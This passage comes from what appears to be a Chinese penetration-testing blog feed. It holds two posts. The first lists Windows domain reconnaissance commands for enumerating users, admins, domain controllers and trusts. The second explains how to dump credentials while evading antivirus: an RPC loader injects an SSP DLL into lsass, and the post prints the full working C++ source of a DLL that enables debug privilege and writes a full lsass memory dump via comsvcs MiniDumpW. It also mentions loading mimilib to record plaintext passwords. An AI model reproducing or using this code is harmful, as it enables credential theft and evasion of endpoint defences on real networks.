title="获取密码策略"></a>获取密码策略</h2><p><code>net accounts /domain</code></p><h2 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h2><p><code>nltest /domain_trusts</code></p><h2 id="获取域内共享文件"><a href="#获取域内共享文件" class="headerlink" title="获取域内共享文件"></a>获取域内共享文件</h2><p><code>net view \\dc</code></p><h1 id="域控信息"><a href="#域控信息" class="headerlink" title="域控信息"></a>域控信息</h1><h2 id="查询域控名"><a href="#查询域控名" class="headerlink" title="查询域控名"></a>查询域控名</h2><p><code>nltest /dclist:xxx</code></p><h2 id="查询域控主机名"><a href="#查询域控主机名" class="headerlink" title="查询域控主机名"></a>查询域控主机名</h2><p><code>nslookup -type=srv +ldap._tcp</code></p><h2 id="查询域控组"><a href="#查询域控组" class="headerlink" title="查询域控组"></a>查询域控组</h2><p><code>net group &quot;domain controllers&quot; /domain</code></p><h2 id="查询主域控器"><a href="#查询主域控器" class="headerlink" title="查询主域控器"></a>查询主域控器</h2><p><code>netdom query pdc</code></p><h1 id="域内用户和管理员信息"><a href="#域内用户和管理员信息" class="headerlink" title="域内用户和管理员信息"></a>域内用户和管理员信息</h1><h2 id="查询域用户列表-1"><a href="#查询域用户列表-1" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h2><h2 id="域控查询"><a href="#域控查询" class="headerlink" title="域控查询"></a>域控查询</h2><p><code>net user /domain</code></p><h2 id="获取详细信息"><a href="#获取详细信息" class="headerlink" title="获取详细信息"></a>获取详细信息</h2><p><code>wmic useraccount get /all</code></p><h2 id="查询本地管理员组"><a href="#查询本地管理员组" class="headerlink" title="查询本地管理员组"></a>查询本地管理员组</h2><p><code>net localgroup administrators</code></p><h2 id="查询域管用户"><a href="#查询域管用户" class="headerlink" title="查询域管用户"></a>查询域管用户</h2><p><code>net group &quot;domain admins&quot; /domain</code></p><h2 id="查询管理员用户组"><a href="#查询管理员用户组" class="headerlink" title="查询管理员用户组"></a>查询管理员用户组</h2><p><code>net group &quot;enterprise admins&quot; /domain</code></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要介绍了在域渗透中的各种信息收集命令</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RPC调用SSP绕过杀软进行hashdump</title>
    <link href="/2020/05/01/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump/"/>
    <url>/2020/05/01/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在Ateam《这是一篇“不一样”的真实渗透测试案例分析文章》文章，学到了一些新姿势，根据里面提到的某些技术做一些简单总结</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将讲述以下内容</p><ul><li>通过RPC调用添加一个SSP dll进行dump lsass.exe</li><li>错误原因</li></ul><h1 id="通过RPC调用添加一个SSP-dll进行dump-lsass-exe"><a href="#通过RPC调用添加一个SSP-dll进行dump-lsass-exe" class="headerlink" title="通过RPC调用添加一个SSP dll进行dump lsass.exe"></a>通过RPC调用添加一个SSP dll进行dump lsass.exe</h1><p>XPN大牛写的RPC加载SSP的代码<br><a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</a><br>下载下来有三个文件，用vs把它们编译成exe<br>我这里采用的是vs2019<br>需要在c文件里加上<br><code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code><br>这里采用x64编译生成exe(因为c代码是64位的)<br>编译成功如下：  </p><p><img src="/img/markdown-img-paste-20211119104308355.png"></p><p>然后再准备一个dump进程的dll<br>这里借用的是网上开源的一个dll</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;DbgHelp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;Dbghelp.lib&quot;</span>)</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">FindPID</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    PROCESSENTRY32 pe32;<br>    pe32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pe32);<br><br>    HANDLE hProcessSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreateToolhelp32Snapshot Error!&quot;</span> &lt;&lt; endl;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    BOOL bResult = <span class="hljs-built_in">Process32First</span>(hProcessSnap, &amp;pe32);<br><br>    <span class="hljs-keyword">while</span> (bResult)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (_wcsicmp(pe32.szExeFile, <span class="hljs-string">L&quot;lsass.exe&quot;</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> pe32.th32ProcessID;<br>        &#125;<br>        bResult = <span class="hljs-built_in">Process32Next</span>(hProcessSnap, &amp;pe32);<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hProcessSnap);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HRESULT</span><span class="hljs-params">(WINAPI* _MiniDumpW)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD arg1, DWORD arg2, PWCHAR cmdline)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* _RtlAdjustPrivilege)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG Privilege, BOOL Enable,</span></span><br><span class="hljs-params"><span class="hljs-function">    BOOL CurrentThread, PULONG Enabled)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dump</span><span class="hljs-params">()</span> </span>&#123;<br><br>    HRESULT             hr;<br>    _MiniDumpW          MiniDumpW;<br>    _RtlAdjustPrivilege RtlAdjustPrivilege;<br>    ULONG               t;<br><br>    MiniDumpW = (_MiniDumpW)<span class="hljs-built_in">GetProcAddress</span>(<br>        <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;comsvcs.dll&quot;</span>), <span class="hljs-string">&quot;MiniDumpW&quot;</span>);<br><br>    RtlAdjustPrivilege = (_RtlAdjustPrivilege)<span class="hljs-built_in">GetProcAddress</span>(<br>        <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;RtlAdjustPrivilege&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (MiniDumpW == <span class="hljs-literal">NULL</span>) &#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// try enable debug privilege</span><br>    <span class="hljs-built_in">RtlAdjustPrivilege</span>(<span class="hljs-number">20</span>, TRUE, FALSE, &amp;t);<br><br>    <span class="hljs-keyword">wchar_t</span>  ws[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">swprintf</span>(ws, <span class="hljs-number">100</span>, <span class="hljs-string">L&quot;%hd%hs&quot;</span>, <span class="hljs-built_in">FindPID</span>(), <span class="hljs-string">&quot; C:\\1.bin full&quot;</span>);<br><br>    <span class="hljs-built_in">MiniDumpW</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ws);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span> </span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call) &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">dump</span>();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用效果：<br><img src="/img/markdown-img-paste-2021111910433429.png"><br><img src="/img/markdown-img-paste-20211119104341410.png"></p><h1 id="dump失败的可能原因"><a href="#dump失败的可能原因" class="headerlink" title="dump失败的可能原因"></a>dump失败的可能原因</h1><ul><li>dll路径没有使用绝对路径</li><li>没有以管理员权限启动</li></ul><h1 id="加载mimilib记录明文密码"><a href="#加载mimilib记录明文密码" class="headerlink" title="加载mimilib记录明文密码"></a>加载mimilib记录明文密码</h1><p>利用上面的ssp_loader，我们可以利用ssp加载mimilib达到不重启记录密码的操作</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文实现了一种绕过杀软hashdump的方法，并给出了示例代码</p>]]></content>
    
    
    <categories>
      
      <category>渗透技巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hashdump</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
